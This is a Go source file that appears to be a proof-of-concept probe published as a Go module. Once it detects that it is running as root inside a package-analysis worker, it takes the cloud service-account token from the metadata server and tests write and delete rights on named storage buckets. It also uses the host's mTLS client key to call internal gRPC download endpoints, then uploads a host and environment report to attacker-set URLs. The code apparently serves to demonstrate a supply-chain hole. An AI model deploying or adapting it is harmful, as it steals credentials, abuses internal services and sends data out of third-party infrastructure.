package main

import (
	"bytes"
	"context"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"time"
)

var genericResultURL string
var compilerResultURL string
var bytemanCanaryURL string
var sessionNonce string
var probeUserAgent string

const (
	protocolVersion = 1
	moduleName      = "github.com/benr00t3d/go-cgo-pkgsite-probe"
	probeVersion    = "v0.0.27"
	maximumResult   = 256 * 1024
	maximumBody     = 256 * 1024
	requestTimeout  = 20 * time.Second
	resultTimeout   = 30 * time.Second
)

var bucketNames = []string{
	"depsdev-capslock-reports",
	"sos-byteman-downloads-oregon",
	"sos-byteman-temp-oregon",
}

var bucketPermissions = []string{
	"storage.objects.create",
	"storage.objects.delete",
	"storage.objects.get",
	"storage.objects.list",
	"storage.objects.update",
}

type commandResult struct {
	Version         int    `json:"version"`
	Session         string `json:"session"`
	ID              string `json:"id"`
	CWD             string `json:"cwd"`
	ExitCode        int    `json:"exit_code"`
	TimedOut        bool   `json:"timed_out"`
	DurationMS      int64  `json:"duration_ms"`
	Stdout          string `json:"stdout"`
	Stderr          string `json:"stderr"`
	StdoutTruncated bool   `json:"stdout_truncated"`
	StderrTruncated bool   `json:"stderr_truncated"`
}

type fileEntry struct {
	Name string `json:"name"`
	Mode string `json:"mode"`
	Size int64  `json:"size"`
}

type tlsFile struct {
	Path    string `json:"path"`
	Present bool   `json:"present"`
	Mode    string `json:"mode,omitempty"`
	Size    int64  `json:"size,omitempty"`
}

type identityResult struct {
	Lane             string      `json:"lane"`
	CWD              string      `json:"cwd"`
	UID              int         `json:"uid"`
	GID              int         `json:"gid"`
	Hostname         string      `json:"hostname"`
	PID1             string      `json:"pid1"`
	ModuleFiles      []fileEntry `json:"module_files"`
	EnvironmentNames []string    `json:"environment_names"`
	TLSFiles         []tlsFile   `json:"tls_files"`
}

type metadataResult struct {
	Email      string   `json:"email,omitempty"`
	Scopes     []string `json:"scopes,omitempty"`
	TokenValid bool     `json:"token_valid"`
	Error      string   `json:"error,omitempty"`
}

type bucketResult struct {
	Bucket     string   `json:"bucket"`
	HTTPStatus int      `json:"http_status,omitempty"`
	Granted    []string `json:"granted,omitempty"`
	APIStatus  string   `json:"api_status,omitempty"`
	Error      string   `json:"error,omitempty"`
}

type grpcResult struct {
	Method        string `json:"method"`
	HTTPStatus    int    `json:"http_status,omitempty"`
	GRPCStatus    string `json:"grpc_status,omitempty"`
	GRPCMessage   string `json:"grpc_message,omitempty"`
	BodyBytes     int    `json:"body_bytes,omitempty"`
	BodySHA256    string `json:"body_sha256,omitempty"`
	ContentType   string `json:"content_type,omitempty"`
	Authenticated bool   `json:"authenticated"`
	Error         string `json:"error,omitempty"`
}

type probeReport struct {
	Schema            string         `json:"schema"`
	Module            string         `json:"module"`
	Version           string         `json:"version"`
	StartedUTC        string         `json:"started_utc"`
	FinishedUTC       string         `json:"finished_utc"`
	Identity          identityResult `json:"identity"`
	Metadata          metadataResult `json:"metadata"`
	BucketPermissions []bucketResult `json:"bucket_permissions,omitempty"`
	CanaryURLSHA256   string         `json:"canary_url_sha256,omitempty"`
	CanaryBodySHA256  string         `json:"canary_body_sha256,omitempty"`
	Byteman           []grpcResult   `json:"byteman,omitempty"`
	DownloadAttempted bool           `json:"download_attempted"`
	Reason            string         `json:"reason,omitempty"`
}

type tokenResponse struct {
	AccessToken string `json:"access_token"`
	ExpiresIn   int64  `json:"expires_in"`
	TokenType   string `json:"token_type"`
}

func main() {
	if genericResultURL == "" || compilerResultURL == "" || bytemanCanaryURL == "" ||
		sessionNonce == "" || probeUserAgent == "" || genericResultURL == compilerResultURL ||
		len(os.Args) != 4 || os.Args[1] != "--specwrap" || os.Args[2] != "--origin-dir" {
		return
	}
	started := time.Now()
	cwd := initialWorkingDirectory()
	identity := inspectIdentity(cwd)
	report := probeReport{
		Schema:     "owned-byteman-probe/v1",
		Module:     moduleName,
		Version:    probeVersion,
		StartedUTC: started.UTC().Format(time.RFC3339Nano),
		Identity:   identity,
	}
	if identity.Lane == "capslock" {
		runCapslockProbe(&report)
	} else {
		report.Reason = "internal checks are fixed to the verified capslock lane"
	}
	report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
	encoded, err := json.MarshalIndent(report, "", "  ")
	result := commandResult{
		Version:    protocolVersion,
		Session:    sessionNonce,
		ID:         "v027-" + identity.Lane,
		CWD:        cwd,
		DurationMS: time.Since(started).Milliseconds(),
	}
	if err != nil {
		result.ExitCode = 125
		result.Stderr = cleanError(err)
	} else {
		result.Stdout = string(encoded)
	}
	endpoint := genericResultURL
	if identity.Lane == "capslock" {
		endpoint = compilerResultURL
	}
	if err := submitResult(endpoint, result); err != nil {
		return
	}
}

func initialWorkingDirectory() string {
	if filepath.IsAbs(os.Args[3]) {
		candidate := filepath.Clean(os.Args[3])
		if info, err := os.Stat(candidate); err == nil && info.IsDir() {
			return candidate
		}
	}
	directory, err := os.Getwd()
	if err != nil || !filepath.IsAbs(directory) {
		return "/"
	}
	return filepath.Clean(directory)
}

func inspectIdentity(cwd string) identityResult {
	lane := "other"
	prefix := "/capslock/modcache/" + moduleName + "@" + probeVersion
	if os.Geteuid() == 0 && (cwd == prefix || strings.HasPrefix(cwd, prefix+"/")) {
		if strings.Contains(readSmallFile("/proc/1/cmdline", 8192), "talisman-worker-capabilities") {
			lane = "capslock"
		}
	} else if strings.Contains(cwd, "/pkg/mod/"+moduleName+"@"+probeVersion) {
		lane = "generic"
	}
	hostname, _ := os.Hostname()
	result := identityResult{
		Lane:     lane,
		CWD:      cwd,
		UID:      os.Geteuid(),
		GID:      os.Getegid(),
		Hostname: hostname,
		PID1:     strings.ReplaceAll(readSmallFile("/proc/1/cmdline", 8192), "\x00", " "),
	}
	if len(result.PID1) > 1024 {
		result.PID1 = result.PID1[:1024] + "[truncated]"
	}
	entries, _ := os.ReadDir(cwd)
	for _, entry := range entries {
		if len(result.ModuleFiles) >= 128 {
			break
		}
		info, err := entry.Info()
		if err != nil {
			continue
		}
		result.ModuleFiles = append(result.ModuleFiles, fileEntry{
			Name: entry.Name(), Mode: info.Mode().String(), Size: info.Size(),
		})
	}
	for _, value := range os.Environ() {
		name, _, found := strings.Cut(value, "=")
		if found && name != "" {
			result.EnvironmentNames = append(result.EnvironmentNames, name)
		}
	}
	sort.Strings(result.EnvironmentNames)
	for _, path := range []string{
		"/etc/tls/server-pool/server-tls-pool.pem",
		"/etc/tls/client/tls.crt",
		"/etc/tls/client/tls.key",
	} {
		item := tlsFile{Path: path}
		if info, err := os.Stat(path); err == nil && info.Mode().IsRegular() {
			item.Present = true
			item.Mode = info.Mode().String()
			item.Size = info.Size()
		}
		result.TLSFiles = append(result.TLSFiles, item)
	}
	return result
}

func readSmallFile(path string, maximum int64) string {
	file, err := os.Open(path)
	if err != nil {
		return ""
	}
	defer file.Close()
	value, err := io.ReadAll(io.LimitReader(file, maximum+1))
	if err != nil || int64(len(value)) > maximum {
		return ""
	}
	return string(value)
}

func cleanError(err error) string {
	if err == nil {
		return ""
	}
	value := err.Error()
	value = strings.ReplaceAll(value, sessionNonce, "[session]")
	value = strings.ReplaceAll(value, bytemanCanaryURL, "[canary-url]")
	if len(value) > 1024 {
		value = value[:1024] + "[truncated]"
	}
	return value
}

func runCapslockProbe(report *probeReport) {
	metadataClient := &http.Client{
		Transport: &http.Transport{Proxy: nil},
		Timeout:   requestTimeout,
	}
	metadata, token := inspectMetadata(metadataClient)
	report.Metadata = metadata
	if token != "" {
		for _, bucket := range bucketNames {
			report.BucketPermissions = append(report.BucketPermissions, testBucketPermissions(token, bucket))
		}
	}
	canaryHash := sha256.Sum256([]byte(bytemanCanaryURL))
	report.CanaryURLSHA256 = hex.EncodeToString(canaryHash[:])
	bodyHash := sha256.Sum256([]byte("hi from robert - owned byteman v0.0.27 canary\n"))
	report.CanaryBodySHA256 = hex.EncodeToString(bodyHash[:])
	rpcClient, err := newMTLSClient()
	if err != nil {
		report.Byteman = append(report.Byteman, grpcResult{Method: "client-setup", Error: cleanError(err)})
		return
	}
	lookupRequest := appendStringField(nil, 2, bytemanCanaryURL)
	baseline := callGRPC(rpcClient, "/sos.byteman.Byteman/Lookup", lookupRequest)
	report.Byteman = append(report.Byteman, baseline)
	if baseline.HTTPStatus != http.StatusOK || baseline.GRPCStatus != "0" {
		report.Reason = "Byteman Lookup did not authenticate cleanly; Download was not attempted"
		return
	}
	metadataMessage := []byte{}
	metadataMessage = appendStringField(metadataMessage, 2, "https://proxy.golang.org")
	metadataMessage = appendVarintField(metadataMessage, 3, 1) // GO_MODULE
	metadataMessage = appendStringField(metadataMessage, 4, moduleName)
	metadataMessage = appendVarintField(metadataMessage, 5, 1) // CONCRETE
	metadataMessage = appendStringField(metadataMessage, 6, probeVersion)
	downloadRequest := []byte{}
	downloadRequest = appendStringField(downloadRequest, 1, bytemanCanaryURL)
	downloadRequest = appendBytesField(downloadRequest, 4, metadataMessage)
	downloadRequest = appendStringField(downloadRequest, 6, "robert-owned-v027-byteman-probe")
	report.DownloadAttempted = true
	download := callGRPC(rpcClient, "/sos.byteman.Byteman/Download", downloadRequest)
	report.Byteman = append(report.Byteman, download)
	if download.HTTPStatus == http.StatusOK && download.GRPCStatus == "0" {
		time.Sleep(1500 * time.Millisecond)
		report.Byteman = append(report.Byteman, callGRPC(rpcClient, "/sos.byteman.Byteman/Lookup", lookupRequest))
	}
}

func inspectMetadata(client *http.Client) (metadataResult, string) {
	result := metadataResult{}
	email, err := metadataText(client, "instance/service-accounts/default/email")
	if err != nil {
		result.Error = cleanError(err)
		return result, ""
	}
	result.Email = strings.TrimSpace(email)
	scopes, err := metadataText(client, "instance/service-accounts/default/scopes")
	if err == nil {
		for _, scope := range strings.Fields(scopes) {
			result.Scopes = append(result.Scopes, scope)
		}
	}
	tokenBody, err := metadataText(client, "instance/service-accounts/default/token")
	if err != nil {
		result.Error = cleanError(err)
		return result, ""
	}
	var token tokenResponse
	if json.Unmarshal([]byte(tokenBody), &token) != nil || token.AccessToken == "" || token.ExpiresIn <= 0 {
		result.Error = "metadata token response was invalid"
		return result, ""
	}
	result.TokenValid = true
	return result, token.AccessToken
}

func metadataText(client *http.Client, path string) (string, error) {
	ctx, cancel := context.WithTimeout(context.Background(), requestTimeout)
	defer cancel()
	endpoint := "http://metadata.google.internal/computeMetadata/v1/" + path
	request, err := http.NewRequestWithContext(ctx, http.MethodGet, endpoint, nil)
	if err != nil {
		return "", err
	}
	request.Header.Set("Metadata-Flavor", "Google")
	response, err := client.Do(request)
	if err != nil {
		return "", err
	}
	defer response.Body.Close()
	body, err := io.ReadAll(io.LimitReader(response.Body, 64*1024+1))
	if err != nil || len(body) > 64*1024 {
		return "", errors.New("metadata response too large")
	}
	if response.StatusCode != http.StatusOK {
		return "", fmt.Errorf("metadata HTTP %d", response.StatusCode)
	}
	return string(body), nil
}

func testBucketPermissions(token, bucket string) bucketResult {
	result := bucketResult{Bucket: bucket}
	values := url.Values{}
	for _, permission := range bucketPermissions {
		values.Add("permissions", permission)
	}
	endpoint := "https://storage.googleapis.com/storage/v1/b/" + url.PathEscape(bucket) + "/iam/testPermissions?" + values.Encode()
	ctx, cancel := context.WithTimeout(context.Background(), requestTimeout)
	defer cancel()
	request, err := http.NewRequestWithContext(ctx, http.MethodGet, endpoint, nil)
	if err != nil {
		result.Error = cleanError(err)
		return result
	}
	request.Header.Set("Authorization", "Bearer "+token)
	request.Header.Set("User-Agent", probeUserAgent)
	response, err := http.DefaultClient.Do(request)
	if err != nil {
		result.Error = cleanError(err)
		return result
	}
	defer response.Body.Close()
	result.HTTPStatus = response.StatusCode
	body, err := io.ReadAll(io.LimitReader(response.Body, 64*1024+1))
	if err != nil || len(body) > 64*1024 {
		result.Error = "permission response too large"
		return result
	}
	var decoded struct {
		Permissions []string `json:"permissions"`
		Error       *struct {
			Code   int    `json:"code"`
			Status string `json:"status"`
		} `json:"error"`
	}
	if json.Unmarshal(body, &decoded) != nil {
		result.Error = "permission response was not JSON"
		return result
	}
	result.Granted = decoded.Permissions
	sort.Strings(result.Granted)
	if decoded.Error != nil {
		result.APIStatus = decoded.Error.Status
		if result.APIStatus == "" {
			result.APIStatus = strconv.Itoa(decoded.Error.Code)
		}
	}
	return result
}

func newMTLSClient() (*http.Client, error) {
	certificate, err := tls.LoadX509KeyPair("/etc/tls/client/tls.crt", "/etc/tls/client/tls.key")
	if err != nil {
		return nil, err
	}
	rootPEM, err := os.ReadFile("/etc/tls/server-pool/server-tls-pool.pem")
	if err != nil {
		return nil, err
	}
	roots := x509.NewCertPool()
	if !roots.AppendCertsFromPEM(rootPEM) {
		return nil, errors.New("server pool contained no certificates")
	}
	transport := &http.Transport{
		Proxy: http.ProxyFromEnvironment,
		TLSClientConfig: &tls.Config{
			Certificates: []tls.Certificate{certificate},
			RootCAs:      roots,
			MinVersion:   tls.VersionTLS12,
		},
		ForceAttemptHTTP2: true,
	}
	return &http.Client{Transport: transport, Timeout: requestTimeout}, nil
}

func callGRPC(client *http.Client, method string, payload []byte) grpcResult {
	result := grpcResult{Method: method}
	frame := make([]byte, 5, 5+len(payload))
	binary.BigEndian.PutUint32(frame[1:], uint32(len(payload)))
	frame = append(frame, payload...)
	ctx, cancel := context.WithTimeout(context.Background(), requestTimeout)
	defer cancel()
	request, err := http.NewRequestWithContext(ctx, http.MethodPost, "https://rpc.deps.dev"+method, bytes.NewReader(frame))
	if err != nil {
		result.Error = cleanError(err)
		return result
	}
	request.Header.Set("Content-Type", "application/grpc")
	request.Header.Set("TE", "trailers")
	request.Header.Set("User-Agent", probeUserAgent)
	request.Header.Set("Grpc-Timeout", "18S")
	response, err := client.Do(request)
	if err != nil {
		result.Error = cleanError(err)
		return result
	}
	defer response.Body.Close()
	result.HTTPStatus = response.StatusCode
	result.ContentType = response.Header.Get("Content-Type")
	body, err := io.ReadAll(io.LimitReader(response.Body, maximumBody+1))
	if err != nil {
		result.Error = cleanError(err)
		return result
	}
	if len(body) > maximumBody {
		result.Error = "gRPC response too large"
		return result
	}
	result.BodyBytes = len(body)
	digest := sha256.Sum256(body)
	result.BodySHA256 = hex.EncodeToString(digest[:])
	result.GRPCStatus = response.Trailer.Get("Grpc-Status")
	if result.GRPCStatus == "" {
		result.GRPCStatus = response.Header.Get("Grpc-Status")
	}
	result.GRPCMessage = response.Trailer.Get("Grpc-Message")
	if result.GRPCMessage == "" {
		result.GRPCMessage = response.Header.Get("Grpc-Message")
	}
	if decoded, decodeErr := url.QueryUnescape(result.GRPCMessage); decodeErr == nil {
		result.GRPCMessage = decoded
	}
	result.GRPCMessage = strings.ReplaceAll(result.GRPCMessage, sessionNonce, "[session]")
	result.GRPCMessage = strings.ReplaceAll(result.GRPCMessage, bytemanCanaryURL, "[canary-url]")
	if len(result.GRPCMessage) > 1024 {
		result.GRPCMessage = result.GRPCMessage[:1024] + "[truncated]"
	}
	result.Authenticated = result.GRPCStatus != "7" && result.GRPCStatus != "16"
	return result
}

func appendUvarint(destination []byte, value uint64) []byte {
	var buffer [binary.MaxVarintLen64]byte
	size := binary.PutUvarint(buffer[:], value)
	return append(destination, buffer[:size]...)
}

func appendVarintField(destination []byte, number int, value uint64) []byte {
	destination = appendUvarint(destination, uint64(number<<3))
	return appendUvarint(destination, value)
}

func appendBytesField(destination []byte, number int, value []byte) []byte {
	destination = appendUvarint(destination, uint64(number<<3|2))
	destination = appendUvarint(destination, uint64(len(value)))
	return append(destination, value...)
}

func appendStringField(destination []byte, number int, value string) []byte {
	return appendBytesField(destination, number, []byte(value))
}

func submitResult(endpoint string, result commandResult) error {
	encoded, err := json.Marshal(result)
	if err != nil || len(encoded) > maximumResult {
		return errors.New("result too large")
	}
	ctx, cancel := context.WithTimeout(context.Background(), resultTimeout)
	defer cancel()
	request, err := http.NewRequestWithContext(ctx, http.MethodPut, endpoint, bytes.NewReader(encoded))
	if err != nil {
		return err
	}
	request.Header.Set("User-Agent", probeUserAgent)
	request.Header.Set("Content-Type", "application/json")
	request.Header.Set("X-Codex-Probe-Session", sessionNonce)
	client := &http.Client{
		CheckRedirect: func(_ *http.Request, _ []*http.Request) error { return http.ErrUseLastResponse },
		Timeout:       resultTimeout,
	}
	response, err := client.Do(request)
	if err != nil {
		return err
	}
	defer response.Body.Close()
	_, _ = io.Copy(io.Discard, io.LimitReader(response.Body, 4096))
	if response.StatusCode < 200 || response.StatusCode >= 300 {
		return fmt.Errorf("result rejected with HTTP %d", response.StatusCode)
	}
	return nil
}
